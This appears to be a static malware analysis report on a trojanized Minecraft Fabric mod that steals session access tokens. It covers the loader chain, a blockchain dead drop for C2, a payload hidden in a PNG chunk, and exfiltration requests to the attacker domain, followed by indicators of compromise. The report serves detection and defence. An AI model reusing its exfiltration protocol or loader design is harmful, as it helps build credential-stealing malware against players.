# SilentNet stage-1 loader — static reconstruction

Clean, readable reconstruction of the Java stage-1 loader in
`SilentNet_sample.jar`. The original was never executed; everything below was
recovered from bytecode, decompiler output, and constant folding.

## Sample

| Property | Value |
|---|---|
| SHA-256 | `b24ae30d9551ed59c0828cd46ddfb6ca41ade6c072ddd10468d51974f8912551` |
| Size | 66,529 bytes |
| Archive | 13 entries (classes + `fabric.mod.json` + manifest), no nested payload |
| Mod id / name | `library` / `Library` |
| Mod version | `1.0.0` |
| Fabric entrypoint | `net.fabric.tFixfrmuk` |
| Manifest main class | `net.fabric.zCj` |
| Build metadata | Fabric 1.21, Loom 1.18.2, loader 0.19.5, intermediary mappings |
| Dependency | `fabricloader >= 0.16.5` |

Classes:

- `net.fabric.zCj` — manifest launcher / relocation
- `net.fabric.tFixfrmuk` — Fabric `ModInitializer` entrypoint
- `net.fabric.hyte` — stage-1 loader (download, unpack, spawn, exfiltrate)
- `net.fabric.endQddej` — reflective Minecraft session theft
- `net.fabric.kQNLxnd` — raw-socket HTTP/1.1 + DoH + trust-all TLS
  - nested `createNhztb`, `aud6`, `copyCszr`

The JAR does **not** contain stage 2. The Python runtime, `main.py`, and the
stealer are downloaded at runtime from the resolved C2 domain.

## Execution chain

### 1. Direct launch (`java -jar`)

`zCj.main`:

- If the first argument is not `-restarted`, forward all arguments to
  `hyte.main(args)`.
- Otherwise scan for `-restarted`; if found, run the in-process launcher.
- If neither applies, relaunch with the original JAR path:

```
<java.home>\bin\javaw.exe -cp <jar> net.fabric.zCj -restarted
```

with:

- working directory `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex`
- stdin `NUL`
- stdout/stderr appended to `_spawn.log`
- `redirectErrorStream(true)`

The relaunched `zCj` calls `hyte.main` directly (same JVM) with a base64 context:

```json
{"userId":"0f80364d-d645-42fb-a112-e4f4f692683e","tag":"Default","domain":"<resolved>","env":"DoubleClick"}
```

### 2. Fabric launch

`tFixfrmuk.onInitialize()` starts a worker thread and:

1. Harvests the live Minecraft session with `endQddej`:
   - access token
   - username
   - UUID (falls back to `"unknown"` if absent)
2. Resolves `gameDir` (cwd if it contains `options.txt`, `config`, or `mods`;
   else `%APPDATA%\.minecraft`; else `%USERPROFILE%\.minecraft`; else cwd).
3. Resolves the C2 domain from the Polygon dead drop.
4. Calls `prefire(domain, accessToken, userId)`.
5. Builds `mcInfo` JSON and base64-encodes it:

```json
{"username":"<username>","uuid":"<uuid>","accessToken":"<token>"}
```

6. Builds the full base64 context:

```json
{
  "mcInfo": "<base64 mcInfo>",
  "prefireId": "<id or null>",
  "userId": "0f80364d-d645-42fb-a112-e4f4f692683e",
  "tag": "Default",
  "domain": "<resolved>",
  "gameDir": "<path>",
  "mcUsername": "<username>",
  "mcUuid": "<uuid>",
  "env": "Fabric"
}
```

7. Spawns:

```
javaw.exe -cp <jar> net.fabric.hyte <base64-context>
```

with the same staging directory, `NUL` stdin, and `_spawn.log` output.

### 3. Stage-1 loader (`hyte.execute`)

1. Create `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex`.
2. Base64-decode and parse the context. `domain` and `userId` are required;
   `env` defaults to `Fabric`.
3. If `python.exe` or `AppHost\main.py` is missing, download and unpack the
   portable Python runtime (3 attempts).
4. Spawn stage 2.
5. Exfiltrate the Minecraft log and the loader's own log.

## C2 resolution — Polygon dead drop

The domain is read from a smart contract with `eth_call`:

- Contract: `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a`
- Selector: `0xce6d41de`
- Request body:

```json
{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x9c0a507300fd902787bb193d80fca5ce6e1bff9a","data":"0xce6d41de"},"latest"],"id":1}
```

RPC endpoints, tried in order:

1. `https://polygon.drpc.org`
2. `https://polygon-bor-rpc.publicnode.com`
3. `https://1rpc.io/matic`
4. `https://api.zan.top/polygon-mainnet`
5. `https://rpc-mainnet.matic.quiknode.pro`

The JSON `result` is a quoted hex string. The loader:

- requires `0x` and at least 130 hex characters
- reads the ABI length word at hex chars 64–128
- rejects length 0 or > 10,000
- reads UTF-8 data from hex chars 128 onward
- caches the resolved domain for the process lifetime

Fallback domain if every RPC fails: `thisisafalsepositive.st`.

## Network protocol

### Prefire

```
POST https://<domain>/shard/prefireMc
Content-Type: application/json
X-Edge-Cache-Revalidate: stale-if-error
X-Runtime-Env: jre-embedded

{"sessionId":"<accessToken>","userId":"<userId>"}
```

On HTTP 200 the loader reads the JSON string key `prefireId`. On any failure it
returns `null` and stage 2 receives the literal value `null`.

### Payload retrieval

```
GET https://<domain>/cdn/v2/9f4e7a2c1b8d.png
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
```

The response must be HTTP 200 with a non-empty body.

### Log exfiltration

```
POST https://<domain>/shard/submitMinecraftLog
Content-Type: application/json
X-Edge-Cache-Revalidate: stale-if-error
X-Runtime-Env: jre-embedded

{
  "userId": "<userId>",
  "content": "<combined log>",
  "filename": "combined.log",
  "mcUsername": "<username>",
  "mcUuid": "<uuid>",
  "executionEnvironment": "<env>-Detached"
}
```

`content` is:

1. `<gameDir>\logs\latest.log`, truncated when longer than 5,000,000 chars to
   first 2,500,000 + `\n=== TRUNCATED ===\n` + last 2,500,000
2. `\n\n========== DETACHED LOG ==========\n` + loader log buffer
3. `\n\n========== RUNTIME ==========\n`
4. `jvm=<java.version>`, `os=<os.name>`, `user=<user.name>`

### Custom HTTP client (`kQNLxnd`)

- Raw `Socket` + hand-written HTTP/1.1, not `HttpURLConnection`
- DNS over HTTPS:
  - connect to `1.1.1.1:443`
  - SNI/Host `cloudflare-dns.com`
  - `GET /dns-query?dns=<base64url>` with `Accept: application/dns-message`
  - no endpoint identification on the DoH leg
- trust-all `X509TrustManager`
- main HTTPS requests set SNI and `endpointIdentificationAlgorithm=HTTPS`
- connect timeout 10 s, read timeout 30 s, receive buffer 512 KiB
- DNS cache 5 minutes
- default User-Agent (when caller does not override):
  `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
- response parser handles `Content-Length`, chunked transfer encoding, and
  read-to-EOF

## Staging directory and files

```
%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\
├── python.exe                 portable Python interpreter
├── AppHost\
│   └── main.py                stage-2 stealer entrypoint
├── _spawn.log                 stdout/stderr of relaunched JVMs
├── _stealer.log               stdout/stderr of stage 2
└── (unpacked runtime files)
```

`zCj` and `tFixfrmuk` both create the directory and append to `_spawn.log`.
`hyte` appends stage-2 output to `_stealer.log`.

## Payload container

The downloaded “PNG” is a valid PNG with a custom chunk:

1. Verify the 8-byte PNG signature `89 50 4E 47 0D 0A 1A 0A`.
2. Walk chunks: 4-byte big-endian length, 4-byte type, data, 4-byte CRC.
3. Find type bytes `h` `I` `d` `s` (`0x68 0x49 0x64 0x73`).
4. Copy the chunk data and inflate it with `java.util.zip.Inflater` (zlib).
5. Treat the inflated bytes as a ZIP archive.
6. Extract every entry into the staging directory.

`hyte.xZCwAAlBY` resolves entry names directly with
`workDir.resolve(entry.getName())` and does not normalize. That is a zip-slip /
path-traversal primitive if the C2 serves a malicious archive.

## Stage-2 command line

```
<workDir>\python.exe <workDir>\AppHost\main.py -u <userId> --env <env>
    [--tag <tag>] [--mcInfo <base64>] [--prefireId <id>]
```

- working directory: `<workDir>\AppHost`
- stdin: `NUL`
- stdout/stderr: append to `<workDir>\_stealer.log`
- `redirectErrorStream(true)`

`--tag` is omitted when the value is `null` or the string `"null"`.
`--mcInfo` and `--prefireId` follow the same rule.

## Minecraft credential theft (`endQddej`)

All three harvesters use the same client-class candidates:

- `net.minecraft.class_310`
- `net.minecraft.client.Minecraft`
- `net.minecraft.client.MinecraftClient`

Client holder:

- static no-arg `getInstance` / `method_1551` returning the client type
- static field `instance` / `field_1700` of the client type

Session object on the client:

- no-arg `getSession` / `getUser` / `method_1548`
- field `session` / `user` / `field_1726`

Username:

- `getUsername` / `getName` / `method_1676`
- field `username` / `name` / `field_1982`

UUID:

- `getProfileId` / `getUuid` / `getUuidOrNull` / `method_44717`
- field `uuid` / `field_1985`

Access token:

- `getAccessToken` / `method_1674`
- field `accessToken` / `field_1983`

The original matching is deliberately loose: it accepts methods by name or by
simple return-type name (`Session`, `User`, `SessionUser`). The clean version
preserves that behaviour.

## Configuration / context schema

### DoubleClick (direct launch)

```json
{
  "userId": "0f80364d-d645-42fb-a112-e4f4f692683e",
  "tag": "Default",
  "domain": "<resolved domain>",
  "env": "DoubleClick"
}
```

### Fabric (mod launch)

```json
{
  "mcInfo": "<base64 of {username,uuid,accessToken}>",
  "prefireId": "<prefire id or null>",
  "userId": "0f80364d-d645-42fb-a112-e4f4f692683e",
  "tag": "Default",
  "domain": "<resolved domain>",
  "gameDir": "<path>",
  "mcUsername": "<username>",
  "mcUuid": "<uuid>",
  "env": "Fabric"
}
```

`mcInfo` decodes to:

```json
{"username":"<username>","uuid":"<uuid>","accessToken":"<token>"}
```

## Indicators of compromise

### Network

- `thisisafalsepositive.st` (fallback C2)
- `https://<domain>/shard/prefireMc`
- `https://<domain>/cdn/v2/9f4e7a2c1b8d.png`
- `https://<domain>/shard/submitMinecraftLog`
- Polygon RPC endpoints:
  - `polygon.drpc.org`
  - `polygon-bor-rpc.publicnode.com`
  - `1rpc.io`
  - `api.zan.top`
  - `rpc-mainnet.matic.quiknode.pro`
- DoH: `1.1.1.1:443`, SNI/Host `cloudflare-dns.com`

### Blockchain

- Contract `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a`
- Selector `0xce6d41de`

### Host

- `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\`
- `_spawn.log`, `_stealer.log`
- `AppHost\main.py`, `python.exe`
- `combined.log` (exfil filename)

### Static

- Mod id `library`, name `Library`, entrypoint `net.fabric.tFixfrmuk`
- Manifest `Main-Class: net.fabric.zCj`
- Fixed userId `0f80364d-d645-42fb-a112-e4f4f692683e`
- Default tag `Default`
- Chrome 131 UA on payload download
- Headers `X-Edge-Cache-Revalidate: stale-if-error`,
  `X-Runtime-Env: jre-embedded`
- PNG chunk type `hIds`

## MITRE ATT&CK-style mapping

| Technique | Observation |
|---|---|
| T1204.002 User Execution: Malicious File | Trojanized Fabric mod JAR |
| T1027 Obfuscated Files or Information | Every string built from char arithmetic |
| T1140 Deobfuscate/Decode Files or Information | Base64 context, char folding |
| T1102 Web Service | Polygon smart contract used as a dead drop |
| T1071.001 Web Protocols | HTTP/HTTPS C2 |
| T1573 Encrypted Channel | TLS, trust-all manager |
| T1105 Ingress Tool Transfer | Portable Python + `main.py` downloaded as PNG |
| T1059.006 Command and Scripting Interpreter: Python | Stage 2 executed with `python.exe` |
| T1528 Steal Application Access Token | Minecraft `accessToken` theft |
| T1552.001 Unsecured Credentials: Credentials In Files | Session fields read reflectively |
| T1005 Data from Local System | `logs/latest.log` collected |
| T1567 Exfiltration Over Web Service | `/shard/submitMinecraftLog` |
| T1036 Masquerading | Fake PNG payload and browser-like headers |
| T1074.001 Data Staged: Local Data Staging | Minecraft log + loader log combined in memory before exfiltration |

## Reconstruction files

| File | Original class | Purpose |
|---|---|---|
| `Stage1Launcher.java` | `zCj` | manifest main, relocation, DoubleClick context |
| `FabricEntrypoint.java` | `tFixfrmuk` | Fabric entrypoint, harvest, prefire, spawn |
| `Stage1Loader.java` | `hyte` | domain resolution, payload unpack, stage-2 spawn, exfil |
| `SessionHarvester.java` | `endQddej` | reflective Minecraft session theft |
| `HttpClient.java` | `kQNLxnd` | raw HTTP/1.1, DoH, trust-all TLS |
| `Json.java` | inline helpers | original-style JSON escape/extract |

All files are under `src/`.

Compile check:

```
javac -Xlint:all -d out src/*.java
```

The reconstruction compiles cleanly with JDK 25. It was not executed.

## Limitations

- Stage 2 is remote-only and was **not** downloaded or executed, to avoid
  contacting attacker infrastructure. Its behaviour beyond the command line and
  log path is unknown from this sample.
- The reconstruction is behaviour-oriented, not byte-identical. Cosmetic log
  strings were rebuilt from char arithmetic and may differ by a character.
- The original obfuscation reuses local variable slots, so folded comments in
  decompiler output are sometimes contaminated. Ambiguous constants were
  rechecked against `javap -c -p` and recomputed from the char expressions.
- No dynamic confirmation was performed: no JVM execution of the sample, no DNS
  or HTTPS requests, and no Ethereum RPC calls.
- The `endQddej` reflection paths are environment-dependent; exact success
  depends on the Minecraft/Fabric version and mapping set present at runtime.
